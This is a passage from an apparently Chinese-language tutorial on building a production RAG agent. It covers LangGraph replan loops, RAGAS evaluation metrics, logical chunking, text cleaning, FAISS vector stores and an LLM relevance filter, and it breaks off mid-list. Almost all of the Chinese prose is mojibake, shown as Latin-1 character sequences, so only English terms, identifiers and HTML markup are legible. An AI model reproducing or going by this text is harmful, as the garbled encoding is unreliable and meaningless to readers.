<table><thead><tr><th><strong>å·¥å…·åç§°</strong></th><th><strong>ä½œç”¨</strong></th><th><strong>é€‚ç”¨åœºæ™¯</strong></th></tr></thead><tbody><tr><td><strong><code>chosen_tool_is_retrieve_quotes</code></strong></td><td>æ£€ç´¢<strong>ç‰¹å®šçš„å¼•ç”¨</strong>æˆ–å¯¹è¯ã€‚</td><td>å¯»æ‰¾ç²¾ç¡®çš„è¯æ®æˆ–å…³é”®å°è¯ã€‚</td></tr><tr><td><strong><code>chosen_tool_is_retrieve_chunks</code></strong></td><td>æ£€ç´¢<strong>ä¸€èˆ¬æ€§ä¿¡æ¯</strong>å’Œä¸Šä¸‹æ–‡ç‰‡æ®µã€‚</td><td>è·å–èƒŒæ™¯ä¿¡æ¯ã€äº‹ä»¶æè¿°ã€‚</td></tr><tr><td><strong><code>chosen_tool_is_retrieve_summaries</code></strong></td><td>æ£€ç´¢<strong>ç« èŠ‚/æ–‡æ¡£çš„æ‘˜è¦</strong>ã€‚</td><td>å¿«é€ŸæŒæ¡å®è§‚ä¸»é¢˜å’Œæ¦‚è¦ã€‚</td></tr><tr><td><strong><code>chosen_tool_is_answer</code></strong></td><td>å½“ä¸Šä¸‹æ–‡å……è¶³æ—¶ï¼Œç›´æ¥<strong>åˆæˆç­”æ¡ˆ</strong>ã€‚</td><td>è¯æ®é“¾å·²å®Œæ•´æ„å»ºã€‚</td></tr></tbody></table>
<h4 data-id="heading-4">4. è‡ªæˆ‘ä¿®æ­£ï¼šé‡è§„åˆ’å¾ªç¯ (Replan Cycle)</h4>
<p>åœ¨ä½¿ç”¨ä»»ä¸€æ£€ç´¢å·¥å…·ï¼ˆ<code>retrieve_book_quotes</code>ã€<code>retrieve_chunks</code>Â æˆ–Â <code>retrieve_summaries</code>ï¼‰è·å–æ–°ä¿¡æ¯åï¼Œç³»ç»Ÿè¿›å…¥<strong>åæ€é˜¶æ®µ</strong>ï¼š</p>
<ul>
<li><strong><code>replan</code>ï¼š</strong> Â å®ƒæ¥æ”¶æ–°çš„è¾“å…¥ï¼Œè¯„ä¼°å½“å‰çš„è¿›åº¦å’Œé¢„è®¾çš„ç›®æ ‡ï¼Œç„¶åå†³å®šæ˜¯å¦éœ€è¦<strong>æ›´æ–°ã€æ‰©å±•</strong>æˆ–<strong>ä¿®æ­£</strong>åŸå§‹è®¡åˆ’ã€‚</li>
<li>è¿™ä¸ªÂ <strong><code>task_handler</code>Â -&gt;Â <code>tool</code>Â -&gt;Â <code>replan</code></strong>Â çš„å¾ªç¯ä¼šä¸æ–­é‡å¤ï¼Œç›´åˆ°ç³»ç»Ÿåˆ¤æ–­Â <code>can_be_answered_already</code>Â ä¸ºçœŸã€‚</li>
</ul>
<h4 data-id="heading-5">5. æœ€ç»ˆç­”æ¡ˆåˆæˆä¸è¯„ä¼°</h4>
<ul>
<li><strong><code>get_final_answer</code>ï¼š</strong> Â ä¸€æ—¦é€€å‡ºå¾ªç¯ï¼Œç³»ç»Ÿå°†<strong>ç»¼åˆæ‰€æœ‰æ£€ç´¢åˆ°çš„è¯æ®</strong>å’Œä¸­é—´æ¨ç†è¿‡ç¨‹ï¼Œåˆæˆä¸€ä¸ªå®Œæ•´ä¸”è¯æ®å……åˆ†çš„æœ€ç»ˆå“åº”ã€‚</li>
<li><strong><code>eval_using_RAGAS</code>ï¼š</strong> Â æœ€ç»ˆä¸”å…³é”®çš„ä¸€æ­¥ã€‚æˆ‘ä»¬ä½¿ç”¨Â <strong>RAGAS</strong>Â æ¡†æ¶æ¥<strong>è¯„ä¼°</strong>ç­”æ¡ˆçš„æ€§èƒ½ï¼Œä¸»è¦æ£€æŸ¥<strong>å‡†ç¡®æ€§ (Accuracy)</strong> Â å’Œå¯¹æºæ–‡æœ¬çš„å¿ å®åº¦ (Groundedness)ã€‚</li>
</ul>
<h3 data-id="heading-6">æ­¥éª¤2ï¼šæ„å»ºå…³é”®æŠ€æœ¯æ¨¡å—</h3>
<p>æ„å»ºä¸€ä¸ªå¤æ‚çš„ã€ç”Ÿäº§çº§ RAG ç³»ç»Ÿæ˜¯ä¸€ä¸ª<strong>è¿­ä»£å’Œå¤šå±‚çº§</strong>çš„è¿‡ç¨‹ã€‚å®ƒä»ç²¾ç»†çš„<strong>æ•°æ®å¤„ç†</strong>å¼€å§‹ï¼Œé€šè¿‡<strong>é€»è¾‘åˆ†å—</strong>ä¼˜åŒ–æ£€ç´¢ï¼Œåˆ©ç”¨<strong>åŒ¿ååŒ–</strong>æ¥æ¶ˆé™¤ LLM åå·®ï¼Œç„¶åé€šè¿‡Â <strong>LangGraph</strong>Â å®ç°ä¸€ä¸ªå…·å¤‡<strong>è§„åˆ’ã€åæ€å’Œè‡ªæˆ‘çº æ­£èƒ½åŠ›</strong>çš„ Agent ç³»ç»Ÿï¼Œæœ€ç»ˆç”¨Â <strong>RAGAS</strong>Â ä¿è¯è¾“å‡ºçš„<strong>å‡†ç¡®æ€§</strong>å’Œ<strong>å¯é æ€§</strong>ã€‚</p>
<p>æ„å»º RAG çš„åŸºç¡€åœ¨äºæ•°æ®çš„è´¨é‡å’Œç»“æ„ã€‚</p>
<ul>
<li><strong>æ•°æ®æ¸…æ´— (Cleaning Our Data)ï¼š</strong> Â è¿™æ˜¯ä»»ä½•ç”Ÿäº§ç³»ç»Ÿçš„ç¬¬ä¸€æ­¥ã€‚æ¶‰åŠå»é™¤å™ªå£°ã€å¤„ç†ç¼ºå¤±å€¼ã€æ ¼å¼ç»Ÿä¸€ç­‰ã€‚</li>
<li><strong>åˆ†å—ç­–ç•¥ (Breaking our Data)ï¼š</strong> Â æˆ‘ä»¬éœ€è¦æµ‹è¯•ä¸åŒçš„åˆ†å—ç­–ç•¥ï¼ŒåŒ…æ‹¬ï¼š</li>
</ul>

<ul>
<li><strong>ä¼ ç»Ÿåˆ†å—ï¼š</strong> Â åŸºäºå›ºå®šå­—ç¬¦æ•°æˆ–å¥å­çš„ç®€å•åˆ†å‰²ã€‚</li>
<li><strong>é€»è¾‘åˆ†å—ï¼š</strong> Â åŸºäºæ–‡æ¡£ç»“æ„ï¼ˆå¦‚æ ‡é¢˜ã€æ®µè½ã€ç« èŠ‚ï¼‰çš„è¯­ä¹‰åŒ–åˆ†å‰²ï¼Œå®ƒèƒ½æ›´å®Œæ•´åœ°ä¿ç•™ä¸Šä¸‹æ–‡çš„<strong>è¿è´¯æ€§</strong>ã€‚</li>
</ul>
<p>ä¸ºäº†è§£å†³<strong>é«˜å™ªéŸ³</strong>å’Œ<strong>æ£€ç´¢ä½æ•ˆ</strong>é—®é¢˜ï¼Œæˆ‘ä»¬å¼•å…¥äº†å­å›¾ (Sub Graph) æ¶æ„ï¼š</p>
<ul>
<li><strong>å­å›¾ä½œç”¨ï¼š</strong> Â é€šè¿‡åˆ›å»ºä¸“é—¨çš„æ£€ç´¢å­å›¾ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ£€ç´¢è¿‡ç¨‹<strong>èšç„¦</strong>åˆ°æœ€ç›¸å…³çš„ä¿¡æ¯ä¸Šï¼Œæœ‰æ•ˆè¿‡æ»¤æ‰å™ªéŸ³ã€‚</li>
<li><strong>åˆ›å»ºå­å›¾è§£å†³ Hallucinationsï¼š</strong> Â ä¸€ä¸ªä¸“é—¨çš„å­å›¾å¯ä»¥ä¸“æ³¨äº<strong>äº‹å®çš„éªŒè¯</strong>Â å’Œ<strong>è¯æ®çš„è’¸é¦ (Distillation)</strong> Â ï¼Œç¡®ä¿æœ€ç»ˆç­”æ¡ˆæ˜¯â€œäº‹å®æ‰æ ¹ (Grounded on Facts)â€çš„ã€‚</li>
</ul>
<p>æˆ‘ä»¬åˆ©ç”¨Â <strong>LangGraph</strong>Â æ¥å®ç° Agent çš„è§„åˆ’ä¸æ‰§è¡Œé€»è¾‘ã€‚LangGraph æä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„æ¡†æ¶æ¥<strong>å¯è§†åŒ–</strong>å’Œ<strong>ç®¡ç†</strong>å¤šæ­¥ã€æœ‰çŠ¶æ€çš„ Agent æµç¨‹ã€‚è¿™ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿæ¸…æ™°åœ°çœ‹åˆ°Â <code>task_handler</code>ã€<code>replan</code>Â ç­‰èŠ‚ç‚¹å¦‚ä½•å½¢æˆä¸€ä¸ª<strong>å¯å›æº¯çš„å¾ªç¯</strong>ï¼Œæå¤§åœ°æé«˜äº†å¤æ‚æµç¨‹çš„<strong>å¯è°ƒè¯•æ€§</strong>å’Œ<strong>å¯è§£é‡Šæ€§</strong>ã€‚</p>
<p>ä¸€ä¸ªç”Ÿäº§çº§ç³»ç»Ÿå¿…é¡»èƒ½å¤Ÿ<strong>é‡åŒ–</strong>å…¶æ€§èƒ½ã€‚æˆ‘ä»¬é‡‡ç”¨Â <strong>RAGAS (RAG Assessment)</strong> Â æ¡†æ¶è¿›è¡Œè¯„ä¼°ã€‚</p>

























<table><thead><tr><th><strong>RAGAS å…³é”®æŒ‡æ ‡</strong></th><th><strong>å…³æ³¨ç‚¹</strong></th><th><strong>ç›®æ ‡</strong></th></tr></thead><tbody><tr><td><strong>å¿ å®åº¦ (Faithfulness)</strong></td><td>è¡¡é‡ç”Ÿæˆç­”æ¡ˆçš„<strong>å†…å®¹</strong>æ˜¯å¦å®Œå…¨åŸºäº<strong>æ£€ç´¢åˆ°çš„ä¸Šä¸‹æ–‡</strong>ã€‚</td><td>æœ€å°åŒ–å¹»è§‰ (Hallucination)ã€‚</td></tr><tr><td><strong>ç›¸å…³æ€§ (Relevancy)</strong></td><td>è¡¡é‡æ£€ç´¢åˆ°çš„ä¸Šä¸‹æ–‡æ˜¯å¦ä¸åŸå§‹é—®é¢˜<strong>é«˜åº¦ç›¸å…³</strong>ã€‚</td><td>ä¼˜åŒ–æ£€ç´¢å™¨æ€§èƒ½ã€‚</td></tr><tr><td><strong>ä¸Šä¸‹æ–‡å¬å›ç‡ (Context Recall)</strong></td><td>è¡¡é‡æ£€ç´¢åˆ°çš„ä¸Šä¸‹æ–‡æ˜¯å¦<strong>å……åˆ†å®Œæ•´åœ°åŒ…å«</strong>äº†ç”Ÿæˆç­”æ¡ˆæ‰€éœ€çš„æ‰€æœ‰äº‹å®ã€‚</td><td>ç¡®ä¿æ£€ç´¢åˆ°çš„ä¿¡æ¯æ˜¯å…¨é¢ä¸”å¯é çš„ã€‚</td></tr></tbody></table>
<h3 data-id="heading-7">æ­¥éª¤3ï¼šä¸ºç”Ÿäº§çº§ RAG ç³»ç»Ÿæ‰“ä¸‹ç¯å¢ƒåŸºç¡€</h3>
<p>ä»»ä½•ç”Ÿäº§çº§åº”ç”¨çš„é¦–è¦ä»»åŠ¡éƒ½æ˜¯<strong>å®‰å…¨åœ°ç®¡ç†æ•æ„Ÿä¿¡æ¯</strong>ï¼Œä¸»è¦æ˜¯ API å¯†é’¥ã€‚æˆ‘ä»¬é€šè¿‡ç¯å¢ƒå˜é‡æ¥åŠ è½½è¿™äº›å¯†é’¥ï¼Œé¿å…å°†å…¶ç¡¬ç¼–ç åˆ°ä»£ç ä¸­ã€‚</p>






























<table><thead><tr><th><strong>ç»„ä»¶ç±»åˆ«</strong></th><th><strong>ä½œç”¨</strong></th><th><strong>é€‰å‹è€ƒé‡</strong></th></tr></thead><tbody><tr><td><strong>å¤§è¯­è¨€æ¨¡å‹ (LLM)</strong></td><td>è´Ÿè´£<strong>ç†è§£</strong>é—®é¢˜ã€<strong>è§„åˆ’</strong>æ­¥éª¤ã€<strong>é‡å†™</strong>æŸ¥è¯¢ã€<strong>åˆæˆ</strong>æœ€ç»ˆç­”æ¡ˆã€‚</td><td><strong>æ€§èƒ½ã€æˆæœ¬ã€å“åº”é€Ÿåº¦</strong> ã€‚</td></tr><tr><td><strong>å‘é‡ç¼–ç å™¨ (Embedding)</strong></td><td>è´Ÿè´£å°†æ–‡æœ¬<strong>è½¬åŒ–ä¸ºå‘é‡</strong>ï¼Œä»¥è¿›è¡Œè¯­ä¹‰æœç´¢å’Œæ£€ç´¢ã€‚</td><td><strong>å‡†ç¡®æ€§ã€æ¨¡å‹å°ºå¯¸ã€è¿è¡Œæ•ˆç‡</strong> ã€‚</td></tr><tr><td><strong>å‘é‡æ•°æ®åº“ (Vector DB) &amp; æ£€ç´¢</strong></td><td>è´Ÿè´£<strong>å­˜å‚¨</strong>å’Œ<strong>é«˜æ•ˆæ£€ç´¢</strong>å‘é‡åŒ–çš„æ•°æ®å— (Chunks)ã€‚</td><td><strong>æ£€ç´¢é€Ÿåº¦ã€æ‰©å±•æ€§</strong> ã€‚</td></tr><tr><td><strong>æ–‡æœ¬å…¨æ–‡æ£€ç´¢</strong></td><td>è¾…åŠ©å‘é‡æ£€ç´¢ï¼Œç”¨äº<strong>ç²¾ç¡®åŒ¹é…</strong>æˆ–<strong>å…³é”®è¯è¿‡æ»¤</strong>ã€‚</td><td><strong>ç²¾ç¡®æ€§ã€è¿‡æ»¤èƒ½åŠ›</strong> ã€‚</td></tr></tbody></table>
<h3 data-id="heading-8">æ­¥éª¤4ï¼šä¼ ç»Ÿä¸é€»è¾‘åˆ†å—ç­–ç•¥</h3>
<p>åœ¨å¯¹æ•°æ®è¿›è¡Œ<strong>é¢„å¤„ç†å’Œæ¸…æ´—</strong>ä¹‹å‰ï¼Œæœ€å…³é”®çš„ä¸€æ­¥æ˜¯å®šä¹‰æˆ‘ä»¬çš„<strong>åˆ†å—ç­–ç•¥</strong>â€”â€”å³å¦‚ä½•å°†ä¸€ä»½é•¿æ–‡æ¡£åˆ‡å‰²æˆå¯è¢«æ£€ç´¢çš„å°å•å…ƒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/492f4825174f44aabd6bb43aab66a35b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592734&amp;x-signature=cdf9bHANCz1%2BjKb76T54j0FEa34%3D" alt="" loading="lazy"/></p>
<p><strong>é€»è¾‘åˆ†å—</strong>æ—¨åœ¨æ ¹æ®æ–‡æ¡£æœ¬èº«çš„<strong>ç»“æ„å’Œè¯­ä¹‰</strong>è¿›è¡Œåˆ‡å‰²ï¼Œç¡®ä¿æ¯ä¸ªå—éƒ½åŒ…å«ä¸€ä¸ªå®Œæ•´ã€æœ‰æ„ä¹‰çš„æ¦‚å¿µã€‚åœ¨æˆ‘ä»¬çš„æ•…äº‹ä¹¦ä¸­ï¼Œ <strong>â€œç« èŠ‚ (Chapters)â€</strong> Â å’ŒÂ  <strong>â€œå¼•è¿° (Quotes)â€</strong> Â æ˜¯æœ€ç†æƒ³çš„é€»è¾‘æ–­ç‚¹ã€‚</p>
<p>åœ¨å°è¯´ä¸­ï¼Œ<strong>å¼•è¿°</strong>å¾€å¾€æµ“ç¼©äº†å…³é”®å¯¹è¯ã€äººç‰©å…³ç³»æˆ–é‡è¦æƒ…èŠ‚ï¼Œæ˜¯æ¬¡äºç« èŠ‚çš„é‡è¦ä¿¡æ¯å•å…ƒã€‚åœ¨é‡‘èæ–‡æ¡£ä¸­ï¼Œè¿™å¯èƒ½å¯¹åº”äº<strong>è¡¨æ ¼</strong>æˆ–<strong>è´¢åŠ¡æŠ¥è¡¨</strong>ç­‰å…³é”®æ•°æ®å—ã€‚</p>
<p><strong>é€»è¾‘åˆ†å—çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>è¯­ä¹‰å®Œæ•´æ€§ï¼š</strong> Â ä¿è¯äº†æ¯ä¸ªå—ï¼ˆç« èŠ‚æˆ–å¼•è¿°ï¼‰éƒ½å…·æœ‰æ¸…æ™°ã€å®Œæ•´çš„è¯­ä¹‰ï¼Œæå¤§åœ°æé«˜äº†æ£€ç´¢çš„ç›¸å…³æ€§ (Relevancy)ã€‚</li>
<li><strong>å®šåˆ¶åŒ–æ£€ç´¢ï¼š</strong> Â å…è®¸æˆ‘ä»¬åœ¨ RAG ç®¡é“ä¸­åˆ›å»ºä¸“é—¨çš„æ£€ç´¢å™¨ï¼Œä¾‹å¦‚ï¼Œä¸€ä¸ªä¸“é—¨ç”¨äºæ£€ç´¢<strong>å…³é”®å¯¹è¯</strong>çš„å·¥å…·ï¼ˆå¦‚åœ¨ Agent ç³»ç»Ÿä¸­ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-9">æ­¥éª¤5ï¼šæ•°æ®æ¸…æ´—ï¼ˆä¸º RAG ç³»ç»Ÿå‡†å¤‡çº¯å‡€çš„æ–‡æœ¬ï¼‰</h3>
<p>åŸå§‹çš„ PDF æå–æ–‡æœ¬ä¸­å¾€å¾€å……æ–¥ç€å„ç§æ ¼å¼é”™è¯¯ï¼Œå¦‚å¤šä½™çš„ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦å’Œä¸å½“çš„æ¢è¡Œç¬¦ã€‚è¿™äº›â€œå™ªéŸ³â€ä¼šæ˜¾è‘—<strong>å¢åŠ  Token æ¶ˆè€—</strong>ã€<strong>é™ä½ Embedding è´¨é‡</strong>ï¼Œå¹¶æœ€ç»ˆå½±å“ LLM çš„æ¨ç†æ•ˆç‡å’Œå‡†ç¡®æ€§ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21657184d43147d2881cd200c4604a03~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592734&amp;x-signature=OEQJ2VgvswCS7CIjPVgX%2BWnOG3c%3D" alt="" loading="lazy"/></p>
<p>å°½ç®¡æˆ‘ä»¬æ¸…é™¤äº†åˆ¶è¡¨ç¬¦ï¼Œä½†æ–‡æœ¬ä¸­ä»å­˜åœ¨å¤§é‡<strong>ä¸å¿…è¦çš„æ¢è¡Œç¬¦ (<code>\n</code>)</strong> Â å’Œ<strong>å¤šé‡ç©ºæ ¼</strong>ã€‚è¿™äº›å­—ç¬¦ä¸ä»…å¢åŠ äº† Token æ•°é‡ï¼Œè¿˜å¯èƒ½å¯¼è‡´å•è¯åœ¨ä¸åŒçš„è¡Œä¹‹é—´è¢«é”™è¯¯åœ°åˆ†å‰²ã€‚</p>
<p>ä¸ºä»€ä¹ˆè¿™ä¸ªåˆ†æå¾ˆé‡è¦ï¼Ÿ</p>
<ol>
<li><strong>LLM ä¸Šä¸‹æ–‡çª—å£é™åˆ¶ï¼š</strong> Â å¤§è¯­è¨€æ¨¡å‹çš„Â <strong>Context Window</strong>Â (ä¸Šä¸‹æ–‡çª—å£) é•¿åº¦æ˜¯å›ºå®šçš„ã€‚å¦‚æœæˆ‘ä»¬çš„æ£€ç´¢å•å…ƒï¼ˆç« èŠ‚ï¼‰è¿‡é•¿ï¼Œè¶…è¿‡äº† LLM çš„å¤„ç†èƒ½åŠ›ï¼ŒLLM å°±å¯èƒ½æ— æ³•å¤„ç†å…¨éƒ¨ä¿¡æ¯ã€‚</li>
<li><strong>RAG ç³»ç»Ÿçš„å¤„ç†ç²’åº¦ï¼š</strong> Â å°½ç®¡åœ¨æˆ‘ä»¬çš„æ¡ˆä¾‹ä¸­ï¼ˆç« èŠ‚å­—æ•°è¿œä½äºå¤§å¤šæ•°ä¸»æµ LLM çš„ä¸Šä¸‹æ–‡é™åˆ¶ï¼‰ï¼Œè¿™äº›æ•°æ®çœ‹èµ·æ¥å®‰å…¨ã€‚ä½†åœ¨å¤„ç†æé•¿æ–‡æ¡£ï¼ˆå¦‚æ³•å¾‹æ–‡ä»¶æˆ–æŠ€æœ¯æ‰‹å†Œï¼‰æ—¶ï¼Œå¦‚æœç« èŠ‚å­—æ•°è¿‡é«˜ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å¯¹<strong>ç« èŠ‚</strong>è¿›è¡Œè¿›ä¸€æ­¥çš„<strong>åˆ†å— (Sub-Chunking)</strong> ï¼Œæˆ–é‡‡ç”¨<strong>æ‘˜è¦ (Summarization)</strong> Â ç­–ç•¥ï¼Œä»¥ç¡®ä¿ä¿¡æ¯èƒ½è¢« LLM å®Œå…¨æ¥æ”¶å’Œæœ‰æ•ˆæ¨ç†ã€‚</li>
</ol>
<h3 data-id="heading-10">æ­¥éª¤6ï¼šæ•°æ®å‘é‡åŒ–ï¼ˆæ„å»ºé«˜æ•ˆæ£€ç´¢çš„åŸºç¡€ï¼‰</h3>
<p>ä¸‹ä¸€æ­¥æ˜¯å°†æˆ‘ä»¬çš„æ–‡æœ¬æ•°æ®è½¬åŒ–ä¸ºæœºå™¨å¯ç†è§£çš„æ•°å­¦å½¢å¼â€”â€”<strong>å‘é‡ (Vectors)</strong> ã€‚è¿™æ˜¯ RAG (Retrieval-Augmented Generation) ç³»ç»Ÿçš„æ ¸å¿ƒï¼Œå®ƒä½¿å¾—æˆ‘ä»¬å¯ä»¥è¿›è¡Œ<strong>è¯­ä¹‰ç›¸ä¼¼æ€§æœç´¢</strong>ï¼Œè€Œä¸æ˜¯ä¼ ç»Ÿçš„å…³é”®è¯åŒ¹é…ã€‚</p>
<p>åœ¨ç¯å¢ƒè®¾ç½®é˜¶æ®µï¼Œæˆ‘ä»¬å·²ç»ç¡®å®šä½¿ç”¨Â <strong>ML2 BERT æ¨¡å‹ (m2_bert_80M_32K)</strong> Â è¿›è¡Œå‘é‡ç¼–ç ã€‚ è¿™æ¬¾æ¨¡å‹å…·å¤‡Â <strong>32k çš„ä¸Šä¸‹æ–‡çª—å£</strong>ï¼ˆè™½ç„¶ç¼–ç å™¨ä¸»è¦å…³æ³¨è¾“å…¥é•¿åº¦ï¼Œä½†è¿™ä¸ªå¤§çª—å£æ˜¾ç¤ºäº†å…¶å¤„ç†é•¿æ–‡æœ¬çš„èƒ½åŠ›ï¼‰å’Œç›¸å¯¹é«˜æ•ˆçš„æ€§èƒ½ï¼Œéå¸¸é€‚åˆåœ¨ RAG è®¾ç½®ä¸­å¯¹æ–‡æ¡£è¿›è¡Œ<strong>å¯†é›†å‘é‡è¡¨ç¤º</strong>ã€‚</p>
<p>ä¸ºäº†é«˜æ•ˆåœ°å­˜å‚¨å’Œæ£€ç´¢è¿™äº›é«˜ç»´å‘é‡ï¼Œæˆ‘ä»¬é€‰æ‹©äº†Â <strong>FAISS (Facebook AI Similarity Search)</strong> ã€‚ å®ƒæ˜¯ Meta å¼€æºçš„åº“ï¼Œä¸“é—¨ç”¨äº<strong>é«˜æ•ˆçš„ç›¸ä¼¼æ€§æœç´¢</strong>å’Œ<strong>èšç±»</strong>ã€‚è®¸å¤šä¸»æµäº‘ç«¯å‘é‡æ•°æ®åº“ï¼ˆå¦‚ Qdrantã€Pineconeï¼‰ä¹Ÿå¸¸å¸¸é›†æˆæˆ–æ”¯æŒ FAISS çš„åº•å±‚æŠ€æœ¯ï¼Œä»¥æå‡å¤§è§„æ¨¡æ•°æ®çš„æ£€ç´¢æ€§èƒ½ã€‚</p>
<p>å°†ä¸åŒç±»å‹çš„åˆ†å—ï¼ˆä¼ ç»Ÿå—ã€ç« èŠ‚æ‘˜è¦ã€ç‰¹å®šå¼•è¿°ï¼‰å­˜å‚¨åœ¨<strong>ç‹¬ç«‹çš„å‘é‡æ•°æ®åº“</strong>ä¸­ï¼Œä½¿æˆ‘ä»¬çš„ RAG ç³»ç»Ÿèƒ½å¤Ÿå®ç°<strong>å¤šç­–ç•¥æ£€ç´¢</strong>ã€‚ä¾‹å¦‚ï¼š</p>
<ol>
<li>å›ç­”éœ€è¦<strong>ç²¾ç¡®è¯æ®</strong>çš„é—®é¢˜æ—¶ï¼Œå¯ä»¥ä½¿ç”¨Â <code>quotes_vectorstore</code>ã€‚</li>
<li>å›ç­”éœ€è¦<strong>å®è§‚èƒŒæ™¯</strong>çš„é—®é¢˜æ—¶ï¼Œå¯ä»¥ä½¿ç”¨Â <code>chapter_summaries_vectorstore</code>ã€‚</li>
<li>å›ç­”éœ€è¦<strong>è¯¦ç»†ä¸Šä¸‹æ–‡</strong>çš„é—®é¢˜æ—¶ï¼Œå¯ä»¥ä½¿ç”¨Â <code>book_splits_vectorstore</code>ã€‚</li>
</ol>
<h3 data-id="heading-11">æ­¥éª¤7ï¼šå¤šç­–ç•¥ä¸Šä¸‹æ–‡æ£€ç´¢å™¨</h3>
<p>ç°åœ¨è¿›å…¥ RAG ç®¡é“çš„æ ¸å¿ƒç¯èŠ‚ï¼š<strong>æ„å»ºæ£€ç´¢å™¨ (Retriever)</strong> ã€‚æ£€ç´¢å™¨çš„ç›®æ ‡æ˜¯ä»æˆ‘ä»¬å¤šæ ·åŒ–çš„æ•°æ®é›†ä¸­ï¼ˆä¼ ç»Ÿåˆ†å—ã€ç« èŠ‚æ‘˜è¦ã€å¼•è¿°ï¼‰<strong>é«˜æ•ˆä¸”å‡†ç¡®</strong>åœ°æŠ“å–ä¸ç”¨æˆ·é—®é¢˜æœ€ç›¸å…³çš„ä¸Šä¸‹æ–‡ã€‚</p>
<p>æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªæ ¸å¿ƒ RAG å‡½æ•°Â <code>retrieve_context_per_question</code>ï¼Œå°†è´Ÿè´£åè°ƒè¿™ä¸‰ç§æ£€ç´¢ç­–ç•¥ï¼Œå¹¶æ•´åˆæ‰€æœ‰è·å–åˆ°çš„ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å‡½æ•°çš„æ ¸å¿ƒé€»è¾‘ï¼ˆæµç¨‹ç®€è¿°ï¼‰  </span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">retrieve_context_per_question</span>(<span class="hljs-params">state</span>):  
Â  Â Â <span class="hljs-comment"># 1. è·å–é—®é¢˜ question = state["question"]  </span>
Â  Â Â <span class="hljs-comment"># 2. è°ƒç”¨ book_chunks_retriever è·å–è¯¦ç»† context  </span>
Â  Â Â <span class="hljs-comment"># 3. è°ƒç”¨ chapter_summaries_retriever è·å– summary_context (åŒ…å«ç« èŠ‚å·)  </span>
Â  Â Â <span class="hljs-comment"># 4. è°ƒç”¨ book_quotes_retriever è·å– quotes_context  </span>
Â  Â Â   
Â  Â Â <span class="hljs-comment"># 5. æ‹¼æ¥ all_contexts = context + summary_context + quotes_context  </span>
Â  Â Â <span class="hljs-comment"># 6. æ¸…æ´—è½¬ä¹‰å­—ç¬¦  </span>
Â  Â Â   
Â  Â Â <span class="hljs-comment"># 7. è¿”å› {"context": all_contexts, "question": question}</span>
</code></pre>
<p>å‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«<strong>æ•´åˆä¸Šä¸‹æ–‡</strong>å’Œ<strong>åŸå§‹é—®é¢˜</strong>çš„æ–°çŠ¶æ€å­—å…¸ï¼Œå‡†å¤‡ä¼ é€’ç»™ RAG ç®¡é“çš„ä¸‹ä¸€ä¸ªæ­¥éª¤ï¼Œä¾‹å¦‚<strong>æŸ¥è¯¢é‡å†™</strong>æˆ–<strong>ç­”æ¡ˆç”Ÿæˆ</strong>ã€‚</p>
<p>é€šè¿‡è¿™ç§å¤šç­–ç•¥çš„ã€ç²¾ç»†åŒ– Top-K è®¾ç½®çš„æ£€ç´¢æ–¹æ³•ï¼Œæˆ‘ä»¬ç¡®ä¿äº† LLM åœ¨ç”Ÿæˆç­”æ¡ˆæ—¶èƒ½è·å¾—æœ€<strong>å¤šæ ·åŒ–</strong>ã€æœ€<strong>ç›¸å…³</strong>ä¸”å…·å¤‡<strong>é«˜å¯ä¿¡åº¦</strong>çš„è¯æ®é“¾ã€‚</p>
<h3 data-id="heading-12">æ­¥éª¤8ï¼šä½¿ç”¨ LLM è¿‡æ»¤æ— å…³ä¿¡æ¯</h3>
<p>å³ä½¿é€šè¿‡å¤šç­–ç•¥æ£€ç´¢å™¨è·å–äº†æ–‡æ¡£ï¼Œå‘é‡ç›¸ä¼¼æ€§æœç´¢ä»å¯èƒ½è¿”å›ä¸€äº›ä¸æ ¸å¿ƒé—®é¢˜<strong>ç›¸å…³åº¦è¾ƒä½</strong>çš„å™ªéŸ³ä¿¡æ¯ã€‚è¿™äº›æ— å…³å†…å®¹ä¼šå ç”¨ LLM çš„<strong>ä¸Šä¸‹æ–‡çª—å£ (Context Window)</strong> ï¼Œç¨€é‡ŠçœŸæ­£é‡è¦çš„äº‹å®ï¼Œç”šè‡³å¯èƒ½åˆ†æ•£ LLM çš„æ³¨æ„åŠ›ï¼Œå¯¼è‡´<strong>ç”Ÿæˆè´¨é‡ä¸‹é™</strong>ï¼ˆå³è‘—åçš„â€œé’ˆåœ¨å¹²è‰å †â€é—®é¢˜ï¼‰ã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬åœ¨æ£€ç´¢æ­¥éª¤åå¼•å…¥äº†ä¸€ä¸ªå…³é”®çš„åå¤„ç†ç¯èŠ‚ï¼š<strong>ä½¿ç”¨ LLM ä½œä¸ºç²¾ç‚¼è¿‡æ»¤å™¨ (Refinement Filter)</strong> Â ï¼Œå»é™¤æ— å…³ä¿¡æ¯ï¼Œåªä¿ç•™å¯¹å›ç­”é—®é¢˜æœ‰ä»·å€¼çš„å†…å®¹ã€‚</p>
<p>æˆ‘ä»¬é¦–å…ˆå®šä¹‰ä¸€ä¸ª<strong>æŒ‡ä»¤æ¸…æ™°</strong>çš„ Prompt æ¨¡æ¿ï¼Œæ¥æŒ‡å¯¼ LLM å®Œæˆå†…å®¹è¿‡æ»¤ä»»åŠ¡ã€‚è¿™ä¸ª Prompt ä¸¥æ ¼é™åˆ¶äº† LLM çš„è¡Œä¸ºï¼š</p>
<ul>
